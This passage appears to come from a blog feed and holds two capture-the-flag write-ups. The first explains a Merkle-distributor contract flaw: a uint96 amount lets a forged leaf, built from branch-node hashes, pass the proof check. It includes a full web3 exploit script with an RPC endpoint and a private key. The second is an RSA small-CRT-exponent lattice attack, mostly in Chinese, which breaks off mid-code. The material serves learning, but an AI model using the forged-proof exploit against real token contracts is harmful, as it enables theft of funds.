amount<span class="token punctuation">,</span> <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> merkleProof<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isClaimed</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'MerkleDistributor: Drop already claimed.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Verify the merkle proof.</span>        <span class="token builtin">bytes32</span> node <span class="token operator">=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> account<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>MerkleProof<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>merkleProof<span class="token punctuation">,</span> merkleRoot<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'MerkleDistributor: Invalid proof.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Mark it claimed and send the token.</span>        <span class="token function">_setClaimed</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">ERC20Like</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>account<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'MerkleDistributor: Transfer failed.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">Claimed</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> account<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>And <em>tree.json</em> which include whole tree data, the total amount of recipients is 75000 ethers.</p><p>The Setup contract issues a token to the MerkleDistributor contract. And builds a MerkleTree with <strong>Hardcode MerkleRoot</strong> </p><p>The condition to solve the puzzle is:</p><ul><li>distribute all tokens in MerkleDistributor account</li><li>remain at least one recipient account <strong>NO CLAIMED</strong></li></ul><p>It seem that is a “Mission Impossible”. But it is not.</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p><a href="https://github.com/Uniswap/merkle-distributor">merkle-distributor</a><br>A smart contract that distributes a balance of tokens according to a merkle root<br>Using this contract we can implement distribute a token by merkletree.</p><p>However, to compare with the repository of merkle-distributor, I find a small bug in the contract.</p><p><strong>Official contract</strong></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">claim</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> index<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">,</span> <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">calldata</span> merkleProof<span class="token punctuation">)</span> <span class="token keyword">external</span> override<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>Task contract</strong></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">claim</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> index<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">,</span> <span class="token builtin">uint96</span> amount<span class="token punctuation">,</span> <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> merkleProof<span class="token punctuation">)</span> <span class="token keyword">external</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>The parameter <em>amount</em> is uint96 rather than uint256.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>According to the definition and principle of merkletree, every branch node is calculated by keccak256(bytes32, bytes32).</p><p>We notice that the parameter of claim (uint256, address, uint96) exaclty is 64 bytes.(32 + 20 + 12).<br>With calculated abi.encodePacked(index, account, amount), we <strong>can forge a fake leaf node using branch node to bypass the merkle proof</strong>. Thus, we can emit a transfer with no claim index 0 - 63.</p><p>First, we need two branches node to calculate another branch node, which can bypass the merkle proof with correct merkleProof, it is easy to build.</p><p>The most important condition for suitable branch node hash is: <strong>the last 12 bytes MUST be smaller than 75000 ethers</strong>, otherwise we can’t to call transfer token.</p><p>After seaching in <em>tree.json</em>, we found<br><code>              0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a00000f40f0c122ae08d2207b</code>, with <strong>precalculated hashdict</strong>, we can find its sibling node hash <code>0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442</code><br>so we submit a claim with parameters:</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"index"</span><span class="token operator">:</span> 0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442<span class="token punctuation">,</span>    <span class="token property">"account"</span><span class="token operator">:</span> <span class="token string">"0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A"</span><span class="token punctuation">,</span>    <span class="token property">"amount"</span><span class="token operator">:</span> 0x00000f40f0c122ae08d2207b<span class="token punctuation">,</span>    <span class="token property">"merkleProof"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d"</span><span class="token punctuation">,</span>        <span class="token string">"0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde"</span><span class="token punctuation">,</span>        <span class="token string">"0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813"</span><span class="token punctuation">,</span>        <span class="token string">"0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c"</span><span class="token punctuation">,</span>        <span class="token string">"0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5"</span>        <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Transaction successfully submitted, and the balance of the MerkleDistributor account is 2966562950867434987397. Luckily, is magic number is found in <em>tree.json</em> as amount of <strong>node 8</strong>, so we only need to submitted another transaction to claim node 8, thus we can get the flag.</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json<span class="token keyword">from</span> web3 <span class="token keyword">import</span> Web3<span class="token punctuation">,</span> HTTPProviderrpc_endpoint<span class="token operator">=</span>   <span class="token string">'http://35.188.148.32:8545/6e853b32-0a87-40bb-bfbf-85e9cf1b22aa'</span>private_key<span class="token operator">=</span>    <span class="token string">'0x8f5753cd5fa023584595730250634e5f2644880987762f1e8a5728918806f1ab'</span>setup_contract<span class="token operator">=</span> <span class="token string">'0xA3D9Eb4AA4b0f9249618B36b85cbd09744d24f71'</span>tree <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'tree.json'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>MerkleRoot <span class="token operator">=</span> tree<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'merkleRoot'</span><span class="token punctuation">)</span>w3 <span class="token operator">=</span> Web3<span class="token punctuation">(</span>HTTPProvider<span class="token punctuation">(</span>rpc_endpoint<span class="token punctuation">)</span><span class="token punctuation">)</span>account <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>privateKeyToAccount<span class="token punctuation">(</span>private_key<span class="token punctuation">)</span>setup_abi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./output/Setup.abi'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>MerkDrop_abi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./output/MerkleDistributor.abi'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>token_abi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./output/Token.abi'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>setup_contract <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>contract<span class="token punctuation">(</span>address<span class="token operator">=</span>setup_contract<span class="token punctuation">,</span> abi<span class="token operator">=</span>setup_abi<span class="token punctuation">)</span>MerkDrop_address <span class="token operator">=</span> setup_contract<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>merkleDistributor<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span>MerkDrop_contract <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>contract<span class="token punctuation">(</span>address<span class="token operator">=</span>MerkDrop_address<span class="token punctuation">,</span> abi<span class="token operator">=</span>MerkDrop_abi<span class="token punctuation">)</span>token_addr <span class="token operator">=</span> MerkDrop_contract<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>token<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span>token_contract <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>contract<span class="token punctuation">(</span>address<span class="token operator">=</span>token_addr<span class="token punctuation">,</span> abi<span class="token operator">=</span>token_abi<span class="token punctuation">)</span>index <span class="token operator">=</span> <span class="token number">0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442</span>addr <span class="token operator">=</span> <span class="token string">'0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A'</span>amount <span class="token operator">=</span> <span class="token number">0x00000f40f0c122ae08d2207b</span>proof <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d'</span><span class="token punctuation">,</span><span class="token string">'0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde'</span><span class="token punctuation">,</span><span class="token string">'0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813'</span><span class="token punctuation">,</span><span class="token string">'0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c'</span><span class="token punctuation">,</span><span class="token string">'0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5'</span><span class="token punctuation">]</span>TransactionData <span class="token operator">=</span> MerkDrop_contract<span class="token punctuation">.</span>functions<span class="token punctuation">[</span><span class="token string">'claim'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> proof<span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'chainId'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>chain_id<span class="token punctuation">,</span>    <span class="token string">'from'</span><span class="token punctuation">:</span> account<span class="token punctuation">.</span>address<span class="token punctuation">,</span>    <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">3000000</span><span class="token punctuation">,</span>    <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>account<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'value'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>signed_txn <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>signTransaction<span class="token punctuation">(</span>TransactionData<span class="token punctuation">,</span> private_key<span class="token punctuation">)</span>txn_hash <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>sendRawTransaction<span class="token punctuation">(</span>signed_txn<span class="token punctuation">.</span>rawTransaction<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>txrecipet <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>waitForTransactionReceipt<span class="token punctuation">(</span>txn_hash<span class="token punctuation">)</span><span class="token keyword">assert</span> txrecipet<span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> tree<span class="token punctuation">[</span><span class="token string">'claims'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token string">'claims'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'index'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>        amount <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token string">'claims'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>        Proof <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token string">'claims'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'proof'</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> setup_contract<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>isSolved<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        TransactionData <span class="token operator">=</span> MerkDrop_contract<span class="token punctuation">.</span>functions<span class="token punctuation">[</span><span class="token string">'claim'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>amount<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Proof<span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token string">'chainId'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>chain_id<span class="token punctuation">,</span>            <span class="token string">'from'</span><span class="token punctuation">:</span> account<span class="token punctuation">.</span>address<span class="token punctuation">,</span>            <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">3000000</span><span class="token punctuation">,</span>            <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>account<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'value'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        signed_txn <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>signTransaction<span class="token punctuation">(</span>TransactionData<span class="token punctuation">,</span> private_key<span class="token punctuation">)</span>        txn_hash <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>sendRawTransaction<span class="token punctuation">(</span>signed_txn<span class="token punctuation">.</span>rawTransaction<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        txrecipet <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>waitForTransactionReceipt<span class="token punctuation">(</span>txn_hash<span class="token punctuation">)</span>        <span class="token keyword">assert</span> txrecipet<span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>TQLCTF2022 hardrsa</title>
      <link href="/2022/04/20/tqlctf-2022.2.19-2022.2.20/"/>
      <url>/2022/04/20/tqlctf-2022.2.19-2022.2.20/</url>
      
        <content type="html"><![CDATA[<h1 id="TQLCTF-2022-2-19-2022-2-20"><a href="#TQLCTF-2022-2-19-2022-2-20" class="headerlink" title="TQLCTF 2022.2.19-2022.2.20"></a>TQLCTF 2022.2.19-2022.2.20</h1><h2 id="hardrsa"><a href="#hardrsa" class="headerlink" title="hardrsa"></a>hardrsa</h2><h3 id="题目源码："><a href="#题目源码：" class="headerlink" title="题目源码："></a>题目源码：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"TQLCTF{"</span><span class="token punctuation">)</span><span class="token keyword">assert</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">)</span>beta  <span class="token operator">=</span> <span class="token number">0.223</span>delta <span class="token operator">=</span> <span class="token number">0.226</span>gama  <span class="token operator">=</span> <span class="token number">0.292</span>n_size <span class="token operator">=</span> <span class="token number">1024</span>bound_q <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token builtin">int</span><span class="token punctuation">(</span>n_size<span class="token operator">*</span>beta<span class="token punctuation">)</span>bound_p <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token builtin">int</span><span class="token punctuation">(</span>n_size<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span>beta<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> random_prime<span class="token punctuation">(</span>bound_p<span class="token punctuation">,</span> proof<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> random_prime<span class="token punctuation">(</span>bound_q<span class="token punctuation">,</span> proof<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    N <span class="token operator">=</span> p <span class="token operator">*</span> q    <span class="token keyword">if</span> q <span class="token operator">&lt;</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span> beta<span class="token punctuation">)</span> <span class="token keyword">and</span> gcd<span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>        <span class="token keyword">assert</span> p<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">assert</span> q<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    dp <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token builtin">int</span><span class="token punctuation">(</span>n_size <span class="token operator">*</span> delta<span class="token punctuation">)</span><span class="token punctuation">)</span>    dq <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> gcd<span class="token punctuation">(</span>dp<span class="token punctuation">,</span> p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> gcd<span class="token punctuation">(</span>dq<span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>        d <span class="token operator">=</span> crt<span class="token punctuation">(</span><span class="token punctuation">[</span>dp<span class="token punctuation">,</span> dq<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>e <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">assert</span> d <span class="token operator">&gt;</span> <span class="token number">2</span> <span class="token operator">*</span> N <span class="token operator">**</span> gamam <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"N=</span><span class="token interpolation"><span class="token punctuation">{</span>N<span class="token punctuation">}</span></span><span class="token string">\ne=</span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c=</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token comment">#N=17898692915537057253027340409848777379525990043216176404521845629792286203459681133425615460580210961931628383718238208402935069434512008997422795968676635886265184398587211149645171148089263697198308448184434844310802022336492929706736607458307830462086477073132852687216229392067680807130235274969547247389</span><span class="token comment">#e=7545551830675702855400776411651853827548700298411139797799936263327967930532764763078562198672340967918924251144028131553633521880515798926665667805615808959981427173796925381781834763784420392535231864547193756385722359555841096299828227134582178397639173696868619386281360614726834658925680670513451826507</span><span class="token comment">#c=2031772143331409088299956894510278261053644235222590973258899052809440238898925631603059180509792948749674390704473123551866909789808259315538758248037806795516031585011977710042943997673076463232373915245996143847637737207984866535157697240588441997103830717158181959653034344529914097609427019775229834115</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>观察到脚本中有<code>beta</code> 、<code>delta</code> 、<code>gama</code>等参数，猜测本题应该会与coppersmith攻击和lattice相关</p><p>同时可以观察到加密脚本中使用了CRT对RSA的使用</p><p>并且p,q两素数位数相差过大，故根据关键词<em>coppersmith、lattice、CRT、RSA</em>进行检索，搜索到 Alexander May在2002年发表的一篇论文<em>Cryptanalysis of Unbalanced RSA with Small CRT-Exponent</em></p><p>发现其中情况与题目中描述的完全一致，并且满足<strong>section 5</strong> 中<strong>An approach modulo e</strong>的情况，故仔细阅读该部分，实现其攻击方法。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>mm<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>tt<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    beta  <span class="token operator">=</span> <span class="token number">0.233</span>    delta <span class="token operator">=</span> <span class="token number">0.226</span>    gama  <span class="token operator">=</span> <span class="token number">0.292</span>    <span class="token comment"># print(1-2/3*(beta+sqrt(3*beta+beta^2)))</span>    <span class="token comment">#原题的数据</span>    N<span class="token operator">=</span><span class="token number">17898692915537057253027340409848777379525990043216176404521845629792286203459681133425615460580210961931628383718238208402935069434512008997422795968676635886265184398587211149645171148089263697198308448184434844310802022336492929706736607458307830462086477073132852687216229392067680807130235274969547247389</span>    e<span class="token operator">=</span><span class="token number">7545551830675702855400776411651853827548700298411139797799936263327967930532764763078562198672340967918924251144028131553633521880515798926665667805615808959981427173796925381781834763784420392535231864547193756385722359555841096299828227134582178397639173696868619386281360614726834658925680670513451826507</span>    c<span class="token operator">=</span><span class="token number">2031772143331409088299956894510278261053644235222590973258899052809440238898925631603059180509792948749674390704473123551866909789808259315538758248037806795516031585011977710042943997673076463232373915245996143847637737207984866535157697240588441997103830717158181959653034344529914097609427019775229834115</span>        Y<span class="token operator">=</span>floor<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span>delta<span class="token operator">+</span>beta<span class="token punctuation">)</span><span class="token punctuation">)</span>    Z<span class="token operator">=</span>floor<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span>beta<span class="token punctuation">)</span><span class="token punctuation">)</span>        dd<span class="token operator">=</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">+</span>tt<span class="token operator">*</span><span class="token punctuation">(</span>mm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    P<span class="token punctuation">.</span><span class="token operator">&lt;</span>y<span class="token punctuation">,</span>z<span class="token operator">&gt;</span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    pol<span class="token operator">=</span>y<span class="token operator">*</span><span class="token punctuation">(</span>N<span class="token operator">-</span>z<span class="token 